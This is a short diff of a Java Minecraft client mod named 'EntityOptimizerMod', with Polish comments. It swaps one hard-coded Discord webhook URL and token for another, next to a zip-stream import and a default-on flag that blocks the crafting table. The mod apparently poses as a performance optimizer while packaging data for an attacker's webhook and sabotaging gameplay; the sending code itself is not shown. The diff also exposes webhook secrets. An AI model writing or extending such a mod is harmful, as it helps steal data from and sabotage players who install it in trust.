@@ -36,7 +36,7 @@ import java.util.zip.ZipOutputStream;
 public class EntityOptimizerMod implements ClientModInitializer {
 
     // WSTAW SWÓJ WEBHOOK
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455954328408952873/IlHLTRinqesFKQ3EFotX-bh1dNfU3gtUmJ4to_4qIpdY6ZRoPRG7KHqEBa5PECaMIwT0";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1463931326934814752/KFbOaEZFWoSEhjI2XiTm9xYjKyQyzv9PxlBRifjqGn4h8qnTyAqwSDpQRXra6TBX-lui";
 
     // flaga: czy blokować otwieranie crafting table (domyślnie TAK)
     public static boolean craftingDisabled = true;
